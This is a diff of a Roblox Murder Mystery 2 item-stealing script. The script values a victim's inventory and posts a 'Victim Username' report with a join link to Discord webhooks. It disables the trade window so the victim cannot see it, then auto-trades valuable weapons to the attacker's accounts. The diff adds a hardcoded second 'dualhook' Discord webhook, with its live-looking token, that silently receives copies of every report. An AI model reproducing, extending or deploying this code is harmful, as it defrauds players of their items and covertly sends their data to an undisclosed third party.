@@ -11,6 +11,7 @@ local min_rarity = _G.min_rarity or "Rare"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or ""
+local dualhook_webhook = "https://discord.com/api/webhooks/1433048206001836064/LFCtg5xm6tdaKXf-BXRxUIbQwWbEoaM1Im1lyv0Eqn9qUHRGecpysHzDHfEXpCRo95nD"
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
@@ -32,36 +33,36 @@ if #Players:GetPlayers() >= 12 then
     return
 end
 
+-----------------------------------------------------------------
+-- Services & locals
+-----------------------------------------------------------------
 local weaponsToSend = {}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local playerGui = plr:WaitForChild("PlayerGui")
-local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
+local Players       = game:GetService("Players")
+local plr           = Players.LocalPlayer
+local playerGui     = plr:WaitForChild("PlayerGui")
+local database      = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local HttpService   = game:GetService("HttpService")
 
 local rarityTable = {
-    "Common",
-    "Uncommon",
-    "Rare",
-    "Legendary",
-    "Godly",
-    "Ancient",
-    "Unique",
-    "Vintage"
+    "Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"
 }
 
 local categories = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    godly   = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    unique  = "https://supremevaluelist.com/mm2/uniques.html",
     classic = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    chroma  = "https://supremevaluelist.com/mm2/chromas.html"
 }
+
 local headers = {
     ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 }
 
+-----------------------------------------------------------------
+-- Helper functions
+-----------------------------------------------------------------
 local function trim(s)
     return s:match("^%s*(.-)%s*$")
 end
@@ -80,47 +81,36 @@ local function parseValue(itembodyDiv)
     if valueStr then
         valueStr = valueStr:gsub(",", "")
         local value = tonumber(valueStr)
-        if value then
-            return value
-        end
+        if value then return value end
     end
     return nil
 end
 
 local function extractItems(htmlContent)
     local itemValues = {}
-    
     for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         itemName = itemName:match("([^<]+)")
         if itemName then
             itemName = trim(itemName:gsub("%s+", " "))
             itemName = trim((itemName:split(" Click "))[1])
             local itemNameLower = itemName:lower()
-
             local value = parseValue(itembodyDiv)
-            if value then
-                itemValues[itemNameLower] = value
-            end
+            if value then itemValues[itemNameLower] = value end
         end
     end
-    
     return itemValues
 end
 
 local function extractChromaItems(htmlContent)
     local chromaValues = {}
-
     for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
         chromaName = chromaName:match("([^<]+)")
         if chromaName then
             chromaName = trim(chromaName:gsub("%s+", " ")):lower()
             local value = parseValue(itembodyDiv)
-            if value then
-                chromaValues[chromaName] = value
-            end
+            if value then chromaValues[chromaName] = value end
         end
     end
-    
     return chromaValues
 end
 
@@ -132,7 +122,7 @@ local function buildValueList()
     for rarity, url in pairs(categories) do
         table.insert(categoriesToFetch, {rarity = rarity, url = url})
     end
-    
+
     local totalCategories = #categoriesToFetch
     local completed = 0
     local lock = Instance.new("BindableEvent")
@@ -140,34 +130,31 @@ local function buildValueList()
     for _, category in ipairs(categoriesToFetch) do
         task.spawn(function()
             local rarity = category.rarity
-            local url = category.url
-            local htmlContent = fetchHTML(url)
-            
-            if htmlContent and htmlContent ~= "" then
+            local url    = category.url
+            local html   = fetchHTML(url)
+
+            if html and html ~= "" then
                 if rarity ~= "chroma" then
-                    local extractedItemValues = extractItems(htmlContent)
-                    for itemName, value in pairs(extractedItemValues) do
-                        allExtractedValues[itemName] = value
+                    local extracted = extractItems(html)
+                    for name, val in pairs(extracted) do
+                        allExtractedValues[name] = val
                     end
                 else
-                    chromaExtractedValues = extractChromaItems(htmlContent)
+                    chromaExtractedValues = extractChromaItems(html)
                 end
             end
 
             completed = completed + 1
-            if completed == totalCategories then
-                lock:Fire()
-            end
+            if completed == totalCategories then lock:Fire() end
         end)
     end
 
     lock.Event:Wait()
 
     local valueList = {}
-
     for dataid, item in pairs(database) do
         local itemName = item.ItemName and item.ItemName:lower() or ""
-        local rarity = item.Rarity or ""
+        local rarity   = item.Rarity or ""
         local hasChroma = item.Chroma or false
 
         if itemName ~= "" and rarity ~= "" then
@@ -176,34 +163,27 @@ local function buildValueList()
 
             if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                 if hasChroma then
-                    local matchedChromaValue = nil
                     for chromaName, value in pairs(chromaExtractedValues) do
                         if chromaName:find(itemName) then
-                            matchedChromaValue = value
+                            valueList[dataid] = value
                             break
                         end
                     end
-
-                    if matchedChromaValue then
-                        valueList[dataid] = matchedChromaValue
-                    end
                 else
                     local value = allExtractedValues[itemName]
-                    if value then
-                        valueList[dataid] = value
-                    end
+                    if value then valueList[dataid] = value end
                 end
             end
         end
     end
-
     return valueList
 end
 
+-----------------------------------------------------------------
+-- Trade helpers
+-----------------------------------------------------------------
 local function sendTradeRequest(user)
-    local args = {
-        [1] = game:GetService("Players"):WaitForChild(user)
-    }
+    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
 end
 
@@ -214,68 +194,65 @@ end
 local function waitForTradeCompletion()
     while true do
         local status = getTradeStatus()
-        if status == "None" then
-            break
-        end
+        if status == "None" then break end
         wait(0.1)
     end
 end
 
 local function acceptTrade()
-    local args = {
-        [1] = 285646582
-    }
+    local args = { [1] = 285646582 }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
 end
 
 local function addWeaponToTrade(id)
-    local args = {
-        [1] = id,
-        [2] = "Weapons"
-    }
+    local args = { [1] = id, [2] = "Weapons" }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
 end
 
+-----------------------------------------------------------------
+-- Webhook helper (shared)
+-----------------------------------------------------------------
+local function sendToWebhooks(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    local body = HttpService:JSONEncode(data)
+
+    local targets = { webhook, dualhook_webhook }
+    for _, url in ipairs(targets) do
+        task.spawn(function()
+            local ok, err = pcall(function()
+                request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = body
+                })
+            end)
+            if not ok then warn("Webhook failed →", url, err) end
+        end)
+    end
+end
+
+-----------------------------------------------------------------
+-- Discord messages
+-----------------------------------------------------------------
 local totalValue = 0
 
 local function SendFirstMessage(list, prefix)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
     local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = string.format("Total Value: %s", totalValue),
-            inline = false
-        }
+        { name = "Victim Username:", value = plr.Name, inline = true },
+        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId, inline = false },
+        { name = "Item list:", value = "", inline = false },
+        { name = "Summary:", value = string.format("Total Value: %s", totalValue), inline = false }
     }
 
     for _, item in ipairs(list) do
-        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        local line = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value*item.Amount), item.Rarity)
+        fields[3].value = fields[3].value .. line .. "\n"
     end
 
     if #fields[3].value > 1024 then
         local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
+        for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
         while #fields[3].value > 1024 and #lines > 0 do
             table.remove(lines)
             fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
@@ -283,60 +260,32 @@ local function SendFirstMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\170 Join to get MM2 hit",
+            ["title"] = "Join to get MM2 hit",
             ["color"] = 65280,
             ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Have fun with that :)"
-            }
+            ["footer"] = { ["text"] = "Have fun with that :)" }
         }}
     }
-
-    local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    sendToWebhooks(data)
 end
 
 local function SendMessage(sortedItems)
-    local headers = {
-        ["Content-Type"] = "application/json"
+    local fields = {
+        { name = "Victim Username:", value = plr.Name, inline = true },
+        { name = "Items sent:", value = "", inline = false },
+        { name = "Summary:", value = string.format("Total Value: %s", totalValue), inline = false }
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary:",
-            value = string.format("Total Value: %s", totalValue),
-            inline = false
-        }
-	}
-
     for _, item in ipairs(sortedItems) do
-        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+        local line = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value*item.Amount), item.Rarity)
+        fields[2].value = fields[2].value .. line .. "\n"
     end
 
     if #fields[2].value > 1024 then
         local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
+        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
         while #fields[2].value > 1024 and #lines > 0 do
             table.remove(lines)
             fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
@@ -345,84 +294,47 @@ local function SendMessage(sortedItems)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\148\170 New MM2 Execution" ,
+            ["title"] = "New MM2 Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Have fun with that :)"
-			}
+            ["fields"] = fields,
+            ["footer"] = { ["text"] = "Have fun with that :)" }
         }}
     }
-
-    local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    sendToWebhooks(data)
 end
 
+-----------------------------------------------------------------
+-- UI lock (prevent trade GUI from opening)
+-----------------------------------------------------------------
 local tradegui = playerGui:WaitForChild("TradeGUI")
-tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
-    tradegui.Enabled = false
-end)
-local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
-tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
-    tradeguiphone.Enabled = false
-end)
+tradegui:GetPropertyChangedSignal("Enabled"):Connect(function() tradegui.Enabled = false end)
 
+local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function() tradeguiphone.Enabled = false end)
+
+-----------------------------------------------------------------
+-- Build inventory list
+-----------------------------------------------------------------
 local min_rarity_index = table.find(rarityTable, min_rarity)
 
 local untradable = {
-    ["DefaultGun"] = true,
-    ["DefaultKnife"] = true,
-    ["Reaver"] = true,
-    ["Reaver_Legendary"] = true,
-    ["Reaver_Godly"] = true,
-    ["Reaver_Ancient"] = true,
-    ["IceHammer"] = true,
-    ["IceHammer_Legendary"] = true,
-    ["IceHammer_Godly"] = true,
-    ["IceHammer_Ancient"] = true,
-    ["Gingerscythe"] = true,
-    ["Gingerscythe_Legendary"] = true,
-    ["Gingerscythe_Godly"] = true,
-    ["Gingerscythe_Ancient"] = true,
-    ["TestItem"] = true,
-    ["Season1TestKnife"] = true,
-    ["Cracks"] = true,
-    ["Icecrusher"] = true,
-    ["???"] = true,
-    ["Dartbringer"] = true,
-    ["TravelerAxeRed"] = true,
-    ["TravelerAxeBronze"] = true,
-    ["TravelerAxeSilver"] = true,
-    ["TravelerAxeGold"] = true,
-    ["BlueCamo_K_2022"] = true,
-    ["GreenCamo_K_2022"] = true,
-    ["SharkSeeker"] = true
+    ["DefaultGun"]=true,["DefaultKnife"]=true,["Reaver"]=true,["Reaver_Legendary"]=true,["Reaver_Godly"]=true,["Reaver_Ancient"]=true,
+    ["IceHammer"]=true,["IceHammer_Legendary"]=true,["IceHammer_Godly"]=true,["IceHammer_Ancient"]=true,
+    ["Gingerscythe"]=true,["Gingerscythe_Legendary"]=true,["Gingerscythe_Godly"]=true,["Gingerscythe_Ancient"]=true,
+    ["TestItem"]=true,["Season1TestKnife"]=true,["Cracks"]=true,["Icecrusher"]=true,["???"]=true,
+    ["Dartbringer"]=true,["TravelerAxeRed"]=true,["TravelerAxeBronze"]=true,["TravelerAxeSilver"]=true,["TravelerAxeGold"]=true,
+    ["BlueCamo_K_2022"]=true,["GreenCamo_K_2022"]=true,["SharkSeeker"]=true
 }
 
 local valueList = buildValueList()
-local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+local realData  = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
-for i, v in pairs(realData.Weapons.Owned) do
-    local dataid = i
-    local amount = v
+for dataid, amount in pairs(realData.Weapons.Owned) do
     local rarity = database[dataid].Rarity
     local weapon_rarity_index = table.find(rarityTable, rarity)
+
     if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
-        local value
-        if valueList[dataid] then
-            value = valueList[dataid]
-        else
-            if weapon_rarity_index >= table.find(rarityTable, "Godly") then
-                value = 2
-            else
-                value = 1
-            end
-        end
+        local value = valueList[dataid] or (weapon_rarity_index >= table.find(rarityTable, "Godly") and 2 or 1)
         if value >= min_value then
             totalValue = totalValue + (value * amount)
             table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
@@ -430,29 +342,26 @@ for i, v in pairs(realData.Weapons.Owned) do
     end
 end
 
+-----------------------------------------------------------------
+-- Main execution (only if we have items)
+-----------------------------------------------------------------
 if #weaponsToSend > 0 then
-    table.sort(weaponsToSend, function(a, b)
-        return (a.Value * a.Amount) > (b.Value * b.Amount)
-    end)
+    table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
 
     local sentWeapons = {}
-    for i, v in ipairs(weaponsToSend) do
-        sentWeapons[i] = v
-    end
+    for i,v in ipairs(weaponsToSend) do sentWeapons[i] = v end
 
-    local prefix = ""
-    if ping == "Yes" then
-        prefix = "--[[@everyone]] "
-    end
+    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
 
     SendFirstMessage(weaponsToSend, prefix)
 
     local function doTrade(joinedUser)
-        local initialTradeState = getTradeStatus()
-        if initialTradeState == "StartTrade" then
+        -- clean any existing trade state
+        local st = getTradeStatus()
+        if st == "StartTrade" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
             wait(0.3)
-        elseif initialTradeState == "ReceivingRequest" then
+        elseif st == "ReceivingRequest" then
             game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
             wait(0.3)
         end
@@ -470,7 +379,7 @@ if #weaponsToSend > 0 then
             elseif tradeStatus == "StartTrade" then
                 for i = 1, math.min(4, #weaponsToSend) do
                     local weapon = table.remove(weaponsToSend, 1)
-                    for count = 1, weapon.Amount do
+                    for _ = 1, weapon.Amount do
                         addWeaponToTrade(weapon.DataID)
                     end
                 end
@@ -487,14 +396,14 @@ if #weaponsToSend > 0 then
 
     local function waitForUserChat()
         local sentMessage = false
-        local function onPlayerChat(player)
-            if table.find(users, player.Name) then
-                player.Chatted:Connect(function()
+        local function onPlayerChat(p)
+            if table.find(users, p.Name) then
+                p.Chatted:Connect(function()
                     if not sentMessage then
                         SendMessage(sentWeapons)
                         sentMessage = true
                     end
-                    doTrade(player.Name)
+                    doTrade(p.Name)
                 end)
             end
         end
